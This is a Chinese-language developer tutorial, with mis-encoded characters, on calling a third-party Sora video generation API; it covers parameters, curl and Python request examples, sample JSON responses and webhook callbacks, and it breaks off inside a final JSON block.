td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡å°†ä»‹ç»ä¸€ç§ Sora Videos Generation API å¯¹æ¥è¯´æ˜ï¼Œå®ƒæ˜¯å¯ä»¥é€šè¿‡è¾“å…¥è‡ªå®šä¹‰å‚æ•°æ¥ç”ŸæˆSoraå®˜æ–¹çš„è§†é¢‘ã€‚</p>
<h2 data-id="heading-0">ç”³è¯·æµç¨‹</h2>
<p>è¦ä½¿ç”¨ APIï¼Œéœ€è¦å…ˆåˆ° <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fdocuments%2F99a24421-2e22-4028-8201-e19cb834b67e" target="_blank" title="https://platform.acedata.cloud/documents/99a24421-2e22-4028-8201-e19cb834b67e" ref="nofollow noopener noreferrer">Sora Videos Generation API</a> å¯¹åº”é¡µé¢ç”³è¯·å¯¹åº”çš„æœåŠ¡ï¼Œè¿›å…¥é¡µé¢ä¹‹åï¼Œç‚¹å‡»ã€ŒAcquireã€æŒ‰é’®ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/723bf6d78fa64d0f8e03b2445abcb825~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=dMyisU9WguOL455M%2FPEpqe9dBqY%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœä½ å°šæœªç™»å½•æˆ–æ³¨å†Œï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°ç™»å½•é¡µé¢é‚€è¯·æ‚¨æ¥æ³¨å†Œå’Œç™»å½•ï¼Œç™»å½•æ³¨å†Œä¹‹åä¼šè‡ªåŠ¨è¿”å›å½“å‰é¡µé¢ã€‚</p>
<p>åœ¨é¦–æ¬¡ç”³è¯·æ—¶ä¼šæœ‰å…è´¹é¢åº¦èµ é€ï¼Œå¯ä»¥å…è´¹ä½¿ç”¨è¯¥ APIã€‚</p>
<h2 data-id="heading-1">åŸºæœ¬ä½¿ç”¨</h2>
<p>é¦–å…ˆå…ˆäº†è§£ä¸‹åŸºæœ¬çš„ä½¿ç”¨æ–¹å¼ï¼Œå°±æ˜¯è¾“å…¥æç¤ºè¯ <code>prompt</code>ã€å‚è€ƒå›¾ç‰‡é“¾æ¥æ•°ç»„ <code>image_urls</code> ä»¥åŠæ¨¡å‹ <code>model</code>ï¼Œä¾¿å¯è·å¾—å¤„ç†åçš„ç»“æœï¼Œå…·ä½“çš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33781f16d5cb45cb89c9d50261d8ca80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=WfTA%2FkjxAFJtvc6b59eaHsX%2BSQ0%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬è®¾ç½®äº† Request Headersï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li><code>accept</code>ï¼šæƒ³è¦æ¥æ”¶æ€æ ·æ ¼å¼çš„å“åº”ç»“æœï¼Œè¿™é‡Œå¡«å†™ä¸º <code>application/json</code>ï¼Œå³ JSON æ ¼å¼ã€‚</li>
<li><code>authorization</code>ï¼šè°ƒç”¨ API çš„å¯†é’¥ï¼Œç”³è¯·ä¹‹åå¯ä»¥ç›´æ¥ä¸‹æ‹‰é€‰æ‹©ã€‚</li>
</ul>
<p>å¦å¤–è®¾ç½®äº† Request Bodyï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li><code>model</code>ï¼šç”Ÿæˆè§†é¢‘çš„æ¨¡å‹ï¼Œä¸»è¦æœ‰<code>sora-2</code>ã€<code>sora-2-pro</code>ï¼Œç›®å‰ <code>sora-2</code>ã€<code>sora-2-pro</code>å¯ä»¥è‡ªä¸»é€‰æ‹©<code>size</code>ã€<code>duration</code>å‚æ•°çš„è§†é¢‘ï¼Œå…¶ä¸­<code>sora-2-pro</code>å¯ä»¥æ”¯æŒ<code>duration</code>ä¸º25sçš„è§†é¢‘ï¼Œè€Œ<code>sora-2</code>åªæ”¯æŒ10ã€15ç§’çš„è§†é¢‘ã€‚</li>
<li><code>size</code>ï¼šæ­¤æ¬¡è§†é¢‘ç”Ÿæˆä»»åŠ¡çš„æ¸…æ™°åº¦ï¼Œåˆ†åˆ«æœ‰ <code>small</code> ã€ <code>large</code>ã€‚</li>
<li><code>image_urls</code>ï¼šéœ€è¦ä¸Šä¼ çš„å‚è€ƒå›¾ç‰‡é“¾æ¥æˆ–è€…Base64ç¼–ç æ•°ç»„ã€‚</li>
<li><code>duration</code>ï¼šæ­¤æ¬¡è§†é¢‘ç”Ÿæˆä»»åŠ¡çš„æ—¶é•¿ï¼Œåˆ†åˆ«æœ‰10sã€15sã€25sï¼Œç›®å‰åªæœ‰<code>sora-2-pro</code>æ”¯æŒ25sã€‚</li>
<li><code>character_start</code>/<code>character_end</code>ï¼šè§’è‰²åœ¨ç”»é¢ä¸­çš„èµ·æ­¢ä½ç½®ï¼ˆ0-1ï¼‰ï¼Œç”¨äºæ§åˆ¶ä¸»ä½“ä½ç½®ã€‚</li>
<li><code>orientation</code>ï¼šç”»å¹…æ–¹å‘ï¼Œæ”¯æŒ <code>landscape</code>ã€<code>portrait</code>ã€<code>square</code>ã€‚</li>
<li><code>prompt</code>ï¼šæç¤ºè¯ã€‚</li>
<li><code>callback_url</code>ï¼šéœ€è¦å›è°ƒç»“æœçš„URLã€‚</li>
</ul>
<p>é€‰æ‹©ä¹‹åï¼Œå¯ä»¥å‘ç°å³ä¾§ä¹Ÿç”Ÿæˆäº†å¯¹åº”ä»£ç ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5395eedd4dda4e44ad1808f8e53c40bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=ySvYNdCndSQj7gpY19vAkW2a54o%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>ç‚¹å‡»ã€ŒTryã€æŒ‰é’®å³å¯è¿›è¡Œæµ‹è¯•ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¾—åˆ°äº†å¦‚ä¸‹ç»“æœï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"6bf7fb83-5814-4e3e-a4ad-bfa0c26c0b33"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"96166698-4b66-478d-a26b-77a7269c9e01"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k7770rgsevxsmtpbn7xnm5gh"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k7770rgsevxsmtpbn7xnm5gh%2Ftask_01k7770rgsevxsmtpbn7xnm5gh_genid_0bf958d3-cae7-4298-b7b6-99ae439a1ea6_25_10_10_14_06_975715%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A30%3A38Z&amp;se=2025-10-16T13%3A30%3A38Z&amp;sks=b&amp;skt=2025-10-10T12%3A30%3A38Z&amp;ske=2025-10-16T13%3A30%3A38Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=8ebb0df1-a278-4e2e-9c20-f2d373479b3a&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=jigY6Z5qp8%2BTXYobaW0EAJ4%2Fbx6G7t6V1P0iyDeUq48%3D&amp;az=oaivgprodscus"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿”å›ç»“æœä¸€å…±æœ‰å¤šä¸ªå­—æ®µï¼Œä»‹ç»å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>success</code>ï¼Œæ­¤æ—¶è§†é¢‘ç”Ÿæˆä»»åŠ¡çš„çŠ¶æ€æƒ…å†µã€‚</li>
<li><code>task_id</code>ï¼Œæ­¤æ—¶è§†é¢‘ç”Ÿæˆä»»åŠ¡IDã€‚</li>
<li><code>trace_id</code>ï¼Œæ­¤æ—¶è§†é¢‘ç”Ÿæˆè·Ÿè¸ªIDã€‚</li>
<li><code>data</code>ï¼Œæ­¤æ—¶è§†é¢‘ç”Ÿæˆä»»åŠ¡çš„ç»“æœåˆ—è¡¨ã€‚
<ul>
<li><code>id</code>ï¼Œæ­¤æ—¶è§†é¢‘ç”Ÿæˆä»»åŠ¡çš„è§†é¢‘IDã€‚</li>
<li><code>video_url</code>ï¼Œæ­¤æ—¶è§†é¢‘ç”Ÿæˆä»»åŠ¡çš„è§†é¢‘é“¾æ¥ã€‚</li>
<li><code>state</code>ï¼Œæ­¤æ—¶è§†é¢‘ç”Ÿæˆä»»åŠ¡çš„çŠ¶æ€ã€‚</li>
</ul>
</li>
</ul>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¾—åˆ°äº†æ»¡æ„çš„è§†é¢‘ä¿¡æ¯ï¼Œæˆ‘ä»¬åªéœ€è¦æ ¹æ®ç»“æœä¸­ <code>data</code> çš„è§†é¢‘é“¾æ¥åœ°å€è·å–ç”Ÿæˆçš„Soraè§†é¢‘å³å¯ã€‚</p>
<p>å¦å¤–å¦‚æœæƒ³ç”Ÿæˆå¯¹åº”çš„å¯¹æ¥ä»£ç ï¼Œå¯ä»¥ç›´æ¥å¤åˆ¶ç”Ÿæˆï¼Œä¾‹å¦‚ CURL çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">curl -X POST 'https://api.acedata.cloud/sora/videos' \
-H 'accept: application/json' \
-H 'authorization: Bearer {token}' \
-H 'content-type: application/json' \
-d '{
  "size": "large",
  "duration": 15,
  "orientation": "landscape",
  "prompt": "cat running on the river",
  "model": "sora-2"
}'
</code></pre>
<h2 data-id="heading-2">å›¾ç”Ÿè§†é¢‘ä»»åŠ¡</h2>
<p>å¦‚æœæƒ³å›¾ç”Ÿè§†é¢‘ä»»åŠ¡ä»»åŠ¡ï¼Œ é¦–å…ˆå‚æ•°<code>image_urls</code>å¿…é¡»ä¼ å…¥å‚è€ƒå›¾ç‰‡é“¾æ¥ï¼Œå°±å¯ä»¥æŒ‡å®šå¦‚ä¸‹å†…å®¹ï¼š</p>
<ul>
<li>image_urlsï¼šè¯¥å›¾ç”Ÿè§†é¢‘ä»»åŠ¡é‡‡ç”¨çš„å‚è€ƒå›¾é“¾æ¥æ•°ç»„ï¼Œã€‚</li>
</ul>
<p>å¡«å†™æ ·ä¾‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec562e3f72a64ccb9a68b84fdb3af83a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=1YNAC%2F6eDR%2BdL6xjpGtrccA%2F%2BNA%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>å¡«å†™å®Œæ¯•ä¹‹åè‡ªåŠ¨ç”Ÿæˆäº†ä»£ç å¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6b5bcec650741daa7cb335eeed65250~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=Z7wGzt9N6M9ROf8fq7kKG1bUKbE%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>å¯¹åº”çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"https://api.acedata.cloud/sora/videos"</span>

headers = {
    <span class="hljs-string">"accept"</span>: <span class="hljs-string">"application/json"</span>,
    <span class="hljs-string">"authorization"</span>: <span class="hljs-string">"Bearer {token}"</span>,
    <span class="hljs-string">"content-type"</span>: <span class="hljs-string">"application/json"</span>
}

payload = {
    <span class="hljs-string">"size"</span>: <span class="hljs-string">"large"</span>,
    <span class="hljs-string">"duration"</span>: <span class="hljs-number">15</span>,
    <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"landscape"</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"cat running on the river"</span>,
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"sora-2"</span>,
    <span class="hljs-string">"image_urls"</span>: [<span class="hljs-string">"https://cdn.acedata.cloud/11wfp4.png"</span>]
}

response = requests.post(url, json=payload, headers=headers)
<span class="hljs-built_in">print</span>(response.text)
</code></pre>
<p>ç‚¹å‡»è¿è¡Œï¼Œå¯ä»¥å‘ç°ä¼šç«‹å³å¾—åˆ°ä¸€ä¸ªç»“æœï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">{
  <span class="hljs-string">"success"</span>: true,
  <span class="hljs-string">"task_id"</span>: <span class="hljs-string">"dd392ff0-dcb7-4c7a-afd0-9bd4f65c803a"</span>,
  <span class="hljs-string">"trace_id"</span>: <span class="hljs-string">"04fd151c-e942-4c1c-a6ab-9a1b1fe54172"</span>,
  <span class="hljs-string">"data"</span>: [
    {
      <span class="hljs-string">"id"</span>: <span class="hljs-string">"sora-2:task_01k777af4hfmg9g7yfvwsc6zws"</span>,
      <span class="hljs-string">"video_url"</span>: <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k777af4hfmg9g7yfvwsc6zws%2Ftask_01k777af4hfmg9g7yfvwsc6zws_genid_92bae0c5-1703-4a5f-9d9f-c9ed2f9e7176_25_10_10_14_12_924695%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A37%3A32Z&amp;se=2025-10-16T13%3A37%3A32Z&amp;sks=b&amp;skt=2025-10-10T12%3A37%3A32Z&amp;ske=2025-10-16T13%3A37%3A32Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=aa5ddad1-c91a-4f0a-9aca-e20682cc8969&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=5j4dibeaSsDmEka5c%2B9CKHZhRPdqfClQ0tIh03TWXsM%3D&amp;az=oaivgprodscus"</span>,
      <span class="hljs-string">"state"</span>: <span class="hljs-string">"succeeded"</span>
    }
  ]
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç”Ÿæˆçš„æ•ˆæœæ˜¯å›¾ç”Ÿå»ºè§†é¢‘çš„ï¼Œç»“æœä¸ä¸Šæ–‡ç±»ä¼¼ã€‚</p>
<h2 data-id="heading-3">è§’è‰²ç”Ÿæˆè§†é¢‘ä»»åŠ¡</h2>
<p>å¦‚æœæƒ³è§’è‰²ç”Ÿæˆè§†é¢‘ä»»åŠ¡ï¼Œ é¦–å…ˆå‚æ•°<code>character_url</code>å¿…é¡»ä¼ å…¥åˆ›å»ºè§’è‰²éœ€è¦çš„è§†é¢‘é“¾æ¥ï¼Œæ³¨æ„è§†é¢‘ä¸­ä¸€å®šä¸èƒ½å‡ºç°çœŸäººï¼Œå¦åˆ™ä¼šå¤±è´¥ï¼Œå°±å¯ä»¥æŒ‡å®šå¦‚ä¸‹å†…å®¹ï¼š</p>
<ul>
<li>character_urlï¼šåˆ›å»ºè§’è‰²éœ€è¦çš„è§†é¢‘é“¾æ¥ï¼Œæ³¨æ„è§†é¢‘ä¸­ä¸€å®šä¸èƒ½å‡ºç°çœŸäººï¼Œå¦åˆ™ä¼šå¤±è´¥ã€‚</li>
</ul>
<p>å¡«å†™æ ·ä¾‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c0d114d6a1848e2a482ddf5a0fdcaed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=WVihtmB7lRCzkIsOq0xt5l97dN0%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>å¡«å†™å®Œæ¯•ä¹‹åè‡ªåŠ¨ç”Ÿæˆäº†ä»£ç å¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14764bbf558f46d4a3a3e9aec936f7bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=yGW3NLL1Ox4gX8ywLBiw%2FBkv0RY%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>å¯¹åº”çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"https://api.acedata.cloud/sora/videos"</span>

headers = {
    <span class="hljs-string">"accept"</span>: <span class="hljs-string">"application/json"</span>,
    <span class="hljs-string">"authorization"</span>: <span class="hljs-string">"Bearer {token}"</span>,
    <span class="hljs-string">"content-type"</span>: <span class="hljs-string">"application/json"</span>
}

payload = {
    <span class="hljs-string">"size"</span>: <span class="hljs-string">"small"</span>,
    <span class="hljs-string">"duration"</span>: <span class="hljs-number">10</span>,
    <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"landscape"</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"cat running on the river"</span>,
    <span class="hljs-string">"character_url"</span>: <span class="hljs-string">"https://cdn.acedata.cloud/pdidf5.mp4"</span>,
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"sora-2"</span>,
    <span class="hljs-string">"character_end"</span>: <span class="hljs-number">3</span>,
    <span class="hljs-string">"character_start"</span>: <span class="hljs-number">1</span>
}

response = requests.post(url, json=payload, headers=headers)
<span class="hljs-built_in">print</span>(response.text)
</code></pre>
<p>ç‚¹å‡»è¿è¡Œï¼Œå¯ä»¥å‘ç°ä¼šç«‹å³å¾—åˆ°ä¸€ä¸ªç»“æœï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"d9bf5461-29b5-47fd-be90-1fe9197df259"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b7992643-9207-40d6-956b-7577728acc67"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k8ykrztefavaypw6xanw305b"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/cdn/20251101/bee4eeeb4c4660b46dac4548a1ffbc.mp4"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç”Ÿæˆçš„æ•ˆæœæ˜¯è§’è‰²ç”Ÿæˆè§†é¢‘ï¼Œç»“æœä¸ä¸Šæ–‡ç±»ä¼¼ã€‚</p>
<h2 data-id="heading-4">å¼‚æ­¥å›è°ƒ</h2>
<p>ç”±äº Sora Videos Generation APIç”Ÿæˆçš„æ—¶é—´ç›¸å¯¹è¾ƒé•¿ï¼Œå¤§çº¦éœ€è¦ 1-2 åˆ†é’Ÿï¼Œå¦‚æœ API é•¿æ—¶é—´æ— å“åº”ï¼ŒHTTP è¯·æ±‚ä¼šä¸€ç›´ä¿æŒè¿æ¥ï¼Œå¯¼è‡´é¢å¤–çš„ç³»ç»Ÿèµ„æºæ¶ˆè€—ï¼Œæ‰€ä»¥æœ¬ API ä¹Ÿæä¾›äº†å¼‚æ­¥å›è°ƒçš„æ”¯æŒã€‚</p>
<p>æ•´ä½“æµç¨‹æ˜¯ï¼šå®¢æˆ·ç«¯å‘èµ·è¯·æ±‚çš„æ—¶å€™ï¼Œé¢å¤–æŒ‡å®šä¸€ä¸ª <code>callback_url</code> å­—æ®µï¼Œå®¢æˆ·ç«¯å‘èµ· API è¯·æ±‚ä¹‹åï¼ŒAPI ä¼šç«‹é©¬è¿”å›ä¸€ä¸ªç»“æœï¼ŒåŒ…å«ä¸€ä¸ª <code>task_id</code> çš„å­—æ®µä¿¡æ¯ï¼Œä»£è¡¨å½“å‰çš„ä»»åŠ¡ IDã€‚å½“ä»»åŠ¡å®Œæˆä¹‹åï¼Œç”Ÿæˆè§†é¢‘çš„ç»“æœä¼šé€šè¿‡ POST JSON çš„å½¢å¼å‘é€åˆ°å®¢æˆ·ç«¯æŒ‡å®šçš„ <code>callback_url</code>ï¼Œå…¶ä¸­ä¹ŸåŒ…æ‹¬äº† <code>task_id</code> å­—æ®µï¼Œè¿™æ ·ä»»åŠ¡ç»“æœå°±å¯ä»¥é€šè¿‡ ID å…³è”èµ·æ¥äº†ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡ç¤ºä¾‹æ¥äº†è§£ä¸‹å…·ä½“æ€æ ·æ“ä½œã€‚</p>
<p>é¦–å…ˆï¼ŒWebhook å›è°ƒæ˜¯ä¸€ä¸ªå¯ä»¥æ¥æ”¶ HTTP è¯·æ±‚çš„æœåŠ¡ï¼Œå¼€å‘è€…åº”è¯¥æ›¿æ¢ä¸ºè‡ªå·±æ­å»ºçš„ HTTP æœåŠ¡å™¨çš„ URLã€‚æ­¤å¤„ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œä½¿ç”¨ä¸€ä¸ªå…¬å¼€çš„ Webhook æ ·ä¾‹ç½‘ç«™ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwebhook.site%2F%25EF%25BC%258C%25E6%2589%2593%25E5%25BC%2580%25E8%25AF%25A5%25E7%25BD%2591%25E7%25AB%2599%25E5%258D%25B3%25E5%258F%25AF%25E5%25BE%2597%25E5%2588%25B0%25E4%25B8%2580%25E4%25B8%25AA" target="_blank" title="https://webhook.site/%EF%BC%8C%E6%89%93%E5%BC%80%E8%AF%A5%E7%BD%91%E7%AB%99%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA" ref="nofollow noopener noreferrer">webhook.site/ï¼Œæ‰“å¼€è¯¥ç½‘ç«™å³å¯å¾—åˆ°ä¸€â€¦</a> Webhook URLï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/791d8b8bb36547a591c98a9adfe97de3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=bcwNmYS2ZkHlL8zDEThrfr0sTpE%3D" alt="" loading="lazy"/></p>
<p>å°†æ­¤ URL å¤åˆ¶ä¸‹æ¥ï¼Œå°±å¯ä»¥ä½œä¸º Webhook æ¥ä½¿ç”¨ï¼Œæ­¤å¤„çš„æ ·ä¾‹ä¸º <code>https://webhook.site/eb238c4f-da3b-47a5-a922-a93aa5405daa</code>ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®å­—æ®µ <code>callback_url</code> ä¸ºä¸Šè¿° Webhook URLï¼ŒåŒæ—¶å¡«å…¥ç›¸åº”çš„å‚æ•°ï¼Œå…·ä½“çš„å†…å®¹å¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c3686f6b9a84192983044d787d6dab8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=cHogTFqv98IL7vP6VCwXj7JoW9c%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>ç‚¹å‡»è¿è¡Œï¼Œå¯ä»¥å‘ç°ä¼šç«‹å³å¾—åˆ°ä¸€ä¸ªç»“æœï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b8976e18-32dc-4718-9ed8-1ea090fcb6ea"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ç¨ç­‰ç‰‡åˆ»ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>https://webhook.site/eb238c4f-da3b-47a5-a922-a93aa5405daa</code> ä¸Šè§‚å¯Ÿåˆ°ç”Ÿæˆæ­Œæ›²çš„ç»“æœï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/671ddd219b844365812e0b513defebd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767952218&amp;x-signature=kL2KcXjSKWSLIEovekQi7AH77Js%3D" alt="" loading="lazy"/></p>
<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
